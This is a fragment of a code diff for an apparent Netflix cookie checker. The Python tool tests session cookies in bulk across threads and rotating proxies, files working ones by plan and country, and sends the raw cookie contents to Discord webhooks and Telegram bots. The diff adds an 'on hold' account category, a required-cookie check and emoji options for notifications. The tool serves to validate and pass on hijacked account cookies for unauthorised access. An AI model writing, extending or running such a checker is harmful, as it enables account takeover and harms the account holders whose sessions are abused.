                     raw_cookie_content,
                 )
@@ -2599,13 +2837,25 @@ def send_notifications(config, info, is_subscribed, output_filename, formatted_c
             if is_subscribed and usable_nftoken:
                 send_discord_webhook(
                     webhook_cfg.get("url", ""),
-                    build_discord_nftoken_message(info, nftoken_data, nftoken_mode),
+                    build_discord_nftoken_message(
+                        info,
+                        nftoken_data,
+                        nftoken_mode,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                 )
         else:
             if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                 send_discord_webhook(
                     webhook_cfg.get("url", ""),
-                    build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data),
+                    build_discord_full_message(
+                        config,
+                        info,
+                        is_subscribed,
+                        output_filename,
+                        nftoken_data,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                     output_filename,
                     formatted_cookie,
                 )
@@ -2616,7 +2866,14 @@ def send_notifications(config, info, is_subscribed, output_filename, formatted_c
                 send_telegram(
                     telegram_cfg.get("bot_token", ""),
                     telegram_cfg.get("chat_id", ""),
-                    build_telegram_full_message(config, info, is_subscribed, output_filename, None),
+                    build_telegram_full_message(
+                        config,
+                        info,
+                        is_subscribed,
+                        output_filename,
+                        None,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                     output_filename,
                     raw_cookie_content,
                 )
@@ -2625,14 +2882,26 @@ def send_notifications(config, info, is_subscribed, output_filename, formatted_c
                 send_telegram(
                     telegram_cfg.get("bot_token", ""),
                     telegram_cfg.get("chat_id", ""),
-                    build_telegram_nftoken_message(info, nftoken_data, nftoken_mode),
+                    build_telegram_nftoken_message(
+                        info,
+                        nftoken_data,
+                        nftoken_mode,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                 )
         else:
             if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                 send_telegram(
                     telegram_cfg.get("bot_token", ""),
                     telegram_cfg.get("chat_id", ""),
-                    build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data),
+                    build_telegram_full_message(
+                        config,
+                        info,
+                        is_subscribed,
+                        output_filename,
+                        nftoken_data,
+                        use_emojis=notification_emojis_enabled,
+                    ),
                     output_filename,
                     formatted_cookie,
                 )
@@ -2709,7 +2978,7 @@ def check_cookies(num_threads=30, config=None):
         config = copy.deepcopy(DEFAULT_CONFIG)
     create_base_folders()
 
-    counts = {"hits": 0, "free": 0, "bad": 0, "duplicate": 0, "errors": 0}
+    counts = {"hits": 0, "free": 0, "bad": 0, "duplicate": 0, "on_hold": 0, "errors": 0}
     plan_counts = {}
     plan_labels = {}
     run_folder = get_run_folder()
@@ -2820,7 +3089,7 @@ def check_cookies(num_threads=30, config=None):
         valid = counts["hits"] + counts["free"]
         set_console_title(
             f"CookiesLeft {cookies_left[0]}/{cookies_total} Valid {valid} "
-            f"Failed {counts['bad']} Duplicate {counts['duplicate']} Errors {counts['errors']}"
+            f"Failed {counts['bad']} Duplicate {counts['duplicate']} OnHold {counts['on_hold']} Errors {counts['errors']}"
         )
 
     def get_next_proxy(used_proxy_indices):
@@ -2836,6 +3105,7 @@ def check_cookies(num_threads=30, config=None):
         create_base_folders()
         user_guid = info.get("userGuid") if info.get("userGuid") and info.get("userGuid") != "null" else generate_unknown_guid()
         plan_key, plan_folder_label, plan_name = derive_output_plan_bucket(info, is_subscribed)
+        account_on_hold = is_subscribed and is_on_hold_account(info)
         info["userGuid"] = user_guid
         country = info.get("countryOfSignup") or "Unknown"
         random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
@@ -2860,11 +3130,19 @@ def check_cookies(num_threads=30, config=None):
                 write_text_file_safely(duplicate_target, formatted_cookie)
                 if remove_source and os.path.exists(cookie_path):
                     os.remove(cookie_path)
-                return "duplicate", None, None
+                return "duplicate", None, None, False
             processed_emails.add(duplicate_key)
 
         if is_subscribed:
-            output_dir = create_output_folder_when_needed(output_folder, plan_folder_label, run_folder)
+            if account_on_hold:
+                output_dir = create_output_folder_when_needed(
+                    output_folder,
+                    plan_folder_label,
+                    run_folder,
+                    category="On Hold",
+                )
+            else:
+                output_dir = create_output_folder_when_needed(output_folder, plan_folder_label, run_folder)
             result_type = "success"
         else:
             output_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("free"), run_folder)
@@ -2882,12 +3160,14 @@ def check_cookies(num_threads=30, config=None):
             os.remove(cookie_path)
 
         send_notifications(config, info, is_subscribed, filename, formatted_cookie, netscape_content, nftoken_data)
-        return result_type, plan_key, plan_name
+        return result_type, plan_key, plan_name, account_on_hold
 
-    def record_result(result_type, cookie_label, plan_key=None, plan_name=None, result_reason=None, result_country=None):
+    def record_result(result_type, cookie_label, plan_key=None, plan_name=None, result_reason=None, result_country=None, result_on_hold=False):
         with header_lock:
             if result_type == "success":
                 counts["hits"] += 1
+                if result_on_hold:
+                    counts["on_hold"] += 1
                 if plan_key:
                     plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                     if plan_name:
@@ -2995,10 +3275,11 @@ def check_cookies(num_threads=30, config=None):
         result_type = None
         result_reason = None
         result_country = None
+        result_on_hold = False
 
         try:
             cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
-            if not cookies:
+            if not cookies or not has_required_netflix_cookies(cookies):
                 result_type = "failed"
                 result_reason = "missing required cookies"
                 if remove_source_during_result:
@@ -3046,7 +3327,7 @@ def check_cookies(num_threads=30, config=None):
                 if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                     is_subscribed = is_subscribed_account(info)
                     result_country = info.get("countryOfSignup")
-                    result_type, plan_key, plan_name = handle_result(
+                    result_type, plan_key, plan_name, result_on_hold = handle_result(
                         info,
                         netscape_content,
                         cookie_path,
@@ -3101,6 +3382,7 @@ def check_cookies(num_threads=30, config=None):
                 plan_name=plan_name,
                 result_reason=result_reason,
                 result_country=result_country,
+                result_on_hold=result_on_hold,
             )
             if not remove_source_during_result:
                 finalize_bundle_source(task)
@@ -3138,7 +3420,10 @@ def check_cookies(num_threads=30, config=None):
         return
 
     valid = counts["hits"] + counts["free"]
-    set_console_title(f"NetflixChecker - Finished Valid {valid} Failed {counts['bad']} Errors {counts['errors']}")
+    set_console_title(
+        f"NetflixChecker - Finished Valid {valid} Failed {counts['bad']} "
+        f"Duplicate {counts['duplicate']} OnHold {counts['on_hold']} Errors {counts['errors']}"
+    )
 
     if display_mode == "simple":
         render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)
@@ -3156,6 +3441,7 @@ def check_cookies(num_threads=30, config=None):
         print(color_text("Free      :", label_code, True), color_text(str(counts["free"]), free_code, True))
         print(color_text("Bad       :", label_code, True), color_text(str(counts["bad"]), bad_code, True))
         print(color_text("Duplicate :", label_code, True), color_text(str(counts["duplicate"]), value_code, True))
+        print(color_text("OnHold    :", label_code, True), color_text(str(counts["on_hold"]), value_code, True))
         print(color_text("Errors    :", label_code, True), color_text(str(counts["errors"]), bad_code, True))
         print(color_text(line, "\033[95m", True))
 
